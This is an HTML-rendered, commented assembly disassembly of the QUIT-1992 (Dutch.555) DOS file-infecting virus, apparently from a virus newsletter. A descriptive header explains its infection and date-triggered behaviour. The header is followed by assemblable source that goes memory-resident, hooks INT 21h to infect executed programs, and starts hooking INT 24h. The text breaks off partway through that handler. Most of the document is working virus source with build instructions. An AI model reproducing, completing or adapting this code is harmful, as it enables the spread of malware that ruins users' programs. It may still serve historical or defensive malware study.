<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>QUIT1992.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                                                                      </span><span class="sc0">
</span><span class="sc1">;                             QUIT-1992.ASM (DUTCH.555)                                  </span><span class="sc0">
</span><span class="sc1">;                              Disassembly by K”hntark                                                                </span><span class="sc0">
</span><span class="sc1">;                               DATE:  24-Nov-93                                            </span><span class="sc0">
</span><span class="sc1">;                            Assemble with: TASM-2.X</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; QUIT1992.555 virus disassembly, for Crypt Newsletter 21:</span><span class="sc0">
</span><span class="sc1">; The QUIT virus is a straightforward .COM/.EXE program memory resident </span><span class="sc0">
</span><span class="sc1">; file infector.  It is extremely infectious and features an</span><span class="sc0">
</span><span class="sc1">; inventive "Are you resident in memory" check using Int 21h's DOS </span><span class="sc0">
</span><span class="sc1">; version call.  When QUIT becomes resident for the first time,</span><span class="sc0">
</span><span class="sc1">; it sets up its Int 21 handler so any subsequent DOS version check</span><span class="sc0">
</span><span class="sc1">; is also filtered through the virus's Int 24h critical error handler.</span><span class="sc0">
</span><span class="sc1">; In standard practice, the virus's critical error handler returns </span><span class="sc0">
</span><span class="sc1">; a "0" in al, which serves to signal the operating system to ignore</span><span class="sc0">
</span><span class="sc1">; the virus's request to write to an executable program being loaded from</span><span class="sc0">
</span><span class="sc1">; a write-protected disk, and proceed with the loading of the protected</span><span class="sc0">
</span><span class="sc1">; program.  When a previously QUIT-infected program attempts to launch</span><span class="sc0">
</span><span class="sc1">; the virus into memory while a copy of the virus is already installed,</span><span class="sc0">
</span><span class="sc1">; QUIT performs a DOS version check, and looks at the value returned</span><span class="sc0">
</span><span class="sc1">; in al, which will be "0" if the virus has already installed itself</span><span class="sc0">
</span><span class="sc1">; and hooked its critical error handler to the DOS version check.  In</span><span class="sc0">
</span><span class="sc1">; this case, the virus exits.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; QUIT also performs a date/time check - if it is anytime after 1992,</span><span class="sc0">
</span><span class="sc1">; the virus terminates without allowing its host to execute.  [Hence</span><span class="sc0">
</span><span class="sc1">; the name QUIT - all virus infected programs "QUIT" after 1992.]</span><span class="sc0">
</span><span class="sc1">; Obviously, QUIT is extremely noticeable.  It will however, become</span><span class="sc0">
</span><span class="sc1">; resident from any infected program and subsequently infect everything</span><span class="sc0">
</span><span class="sc1">; which is executed while NOT allowing these programs to run.  Of</span><span class="sc0">
</span><span class="sc1">; course, these programs are - for all practical purposes - ruined</span><span class="sc0">
</span><span class="sc1">; immediately &amp; turned into QUIT zombies - unless the time on the</span><span class="sc0">
</span><span class="sc1">; machine is reset to some value before the end of 1992 and kept there.</span><span class="sc0">
</span><span class="sc1">; The overly anal will note that even if the system time is reset</span><span class="sc0">
</span><span class="sc1">; properly, programs are still ruined by QUIT because no one would actually</span><span class="sc0">
</span><span class="sc1">; want this thing attached to their executables.</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">


</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDVIRUS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DATA</span><span class="sc0">
</span><span class="sc5">INT_21H</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">                       
</span><span class="sc5">INT_21H_SEG</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">                       
</span><span class="sc5">INT_24H_OFF</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">INT_24H_SEG</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Bh</span><span class="sc0">
</span><span class="sc5">FILE_TIME</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Dh</span><span class="sc0">
</span><span class="sc5">FILE_DATE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc5">FILE_ATTRIB</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">11h</span><span class="sc0">

</span><span class="sc5">FILE_BUFFER</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">  </span><span class="sc1">;EXE header / COM</span><span class="sc0">
</span><span class="sc5">REMAINDER</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">  </span><span class="sc1">;Remainder</span><span class="sc0">
</span><span class="sc5">FILE_SIZE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">  </span><span class="sc1">;Size of file in 512 byte pages</span><span class="sc0">
</span><span class="sc5">HEADER_SIZE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ah</span><span class="sc0">  </span><span class="sc1">;Size of header</span><span class="sc0">
</span><span class="sc5">MAX_NUM_PAR</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Eh</span><span class="sc0">  </span><span class="sc1">;Maximum # of paragraphs required after loaded program</span><span class="sc0">
</span><span class="sc5">STACK_SEG</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">;Stack Segment offset   (SS)</span><span class="sc0">
</span><span class="sc5">STACK_POINTER</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">22h</span><span class="sc0">  </span><span class="sc1">;Stack Pointer          (SP)</span><span class="sc0">
</span><span class="sc5">INST_PTR</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">26h</span><span class="sc0">  </span><span class="sc1">;Instruction Pointer    (IP)</span><span class="sc0">
</span><span class="sc5">CODE_SEG</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">28h</span><span class="sc0">  </span><span class="sc1">;Offset of Code Segment (CS) in paragraphs</span><span class="sc0">
</span><span class="sc5">EXE_ID</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2Dh</span><span class="sc0">  </span><span class="sc1">;EXE infection ID</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">VIRUS</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">VIRUS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">VIRUS</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">;COM HOST</span><span class="sc0">
</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VIR_START</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F1h</span><span class="sc0">            </span><span class="sc1">;Infection ID</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">994</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;rest of HOST FILE</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;exit to DOS</span><span class="sc0">

</span><span class="sc1">;=-=-=-=-=-=-=-=[HOST ENDS HERE - VIRUS BEGINS HERE]-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class="sc0">

</span><span class="sc5">DATA</span><span class="sc4">:</span><span class="sc0">                

        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">5Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        
</span><span class="sc1">;FILE_BUFFER</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">      </span><span class="sc1">;3 starting bytes from COM file</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">25</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;28 bytes total</span><span class="sc0">

</span><span class="sc5">VIR_START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_ADDR</span><span class="sc0">
</span><span class="sc5">GET_ADDR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">             </span><span class="sc1">;BP = Entry point</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">  </span><span class="sc1">;sub  bp,31h =&gt; 49 bytes of data area</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30F1h</span><span class="sc0">       </span><span class="sc1">;ah=function 30h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">            </span><span class="sc1">;get DOS version number/Virus Resident?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">;BX = DS</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;DOS 2.0 or below?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">CIAO</span><span class="sc0">           </span><span class="sc1">;Exit if DOS &lt; 2.0 or virus resident</span><span class="sc0">
        
</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Allocate Memory</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;BX = DS - 1/get MCB of current program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;DS = DS - 1 = MCB of current program</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;BX = DS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;save DS</span><span class="sc0">
           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0000</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">                  </span><span class="sc1">;23h * 16 = 560 bytes</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0012h</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">;decrease size by 560 bytes </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;decrease size by 560 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc0">                </span><span class="sc1">;add     ax,bx</span><span class="sc0">
        
</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Move Virus to memory</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;AX = ES Destination Segment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;DS = CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">;Source      DS:SI (CS:BP)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;Destination ES:DI (AX:00)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;cx = 555 bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;Mov ds:[si] to es:[di]</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Hook INT 21h</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;DS = ES </span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">            </span><span class="sc1">;mov     cx,ax, CX = New Segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc0">             </span><span class="sc1">;New INT 21h OFFSET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">              </span><span class="sc1">;INT 21h Address in INT table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HOOK_INT</span><span class="sc0">            </span><span class="sc1">;Hook interrupt at 0000:00BL</span><span class="sc0">
                        </span><span class="sc1">;New address = CX:0C7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">INT_21H</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;save ORIGINAL INT 21h OFFSET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">INT_21H_SEG</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;save ORIGINAL INT 21h SEGMENT</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                         </span><span class="sc1">;Enable interrupts</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">;restore BX = DS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;DS = original DS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;ES = original DS</span><span class="sc0">
</span><span class="sc5">CIAO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0"> </span><span class="sc1">;IS HOST an EXE FILE?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">EXIT_COM</span><span class="sc0">                </span><span class="sc1">;Exit COM if not equal</span><span class="sc0">
        
</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; FIX for EXE return</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">;add     bx,10h =&gt; add 10h to DS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;AX = DS + 10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;FIX Stack Pointer SP </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;FIX stack Segment SS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;push SEGMENT  CS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;push OFFSET   IP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SKIP</span><span class="sc0">              </span><span class="sc1">;continue</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; EXIT COM</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

</span><span class="sc5">EXIT_COM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                </span><span class="sc1">;save CS</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Load effective addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">           </span><span class="sc1">;ES:DI =&gt; DS:0100</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                </span><span class="sc1">;save address to do Far Return</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                     </span><span class="sc1">;Mov [si] to es:[di] restore</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                     </span><span class="sc1">;Mov [si] to es:[di] 4 bytes to COM File</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Get YEAR</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

</span><span class="sc5">SKIP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">              </span><span class="sc1">;DOS Services  ah=function 2Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;get date, cx=year, dh=month</span><span class="sc0">
                        </span><span class="sc1">;dl=day, al=day-of-week 0=SUN</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7C8h</span><span class="sc0">             </span><span class="sc1">;Year = 1992?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">RETURN_TO_HOST</span><span class="sc0">      </span><span class="sc1">;Return to host if year &lt; 1992</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">              </span><span class="sc1">;ah=function 4Ch =&gt; QUIT</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;terminate with al=return code</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; RETURN to EXE / COM</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

</span><span class="sc5">RETURN_TO_HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">              </span><span class="sc1">;CX = 00FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">;DS = DX</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                        </span><span class="sc1">;Return far to DS:0100h / IP:CS</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; INT 21h HANDLER</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">                </span><span class="sc1">;Execute a file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EXECUTE</span><span class="sc0">                 </span><span class="sc1">;Jump if equal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30F1h</span><span class="sc0">                </span><span class="sc1">;"Are you there?" call</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">REAL_INT21h</span><span class="sc0">             </span><span class="sc1">;Go to Real int 21h</span><span class="sc0">
        
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc1">; INT 24h Handler</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;"Are you there?" answer</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">;Interrupt return</span><span class="sc0">

</span><span class="sc5">REAL_INT21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_21H</span><span class="sc0">   </span><span class="sc1">;jmp to Original INT 21h</span><span class="sc0">

</span><span class="sc5">OUTTAHEA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">;restore filename pointer at DS:DX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SEE_YA</span><span class="sc0">
</span><span class="sc5">EXECUTE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;***************************************                </span><span class="sc0">
</span><span class="sc1">; Hook INT 24h (critical Error Handler)</span><span class="sc0">
</span><span class="sc1">;***************************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D1h</span><span class="sc0">                 </span><span class="sc1">;New INT 24h offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;New INT 24h Segment = CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                  </span><span class="sc1">;INT 24h</span><span class="sc0">
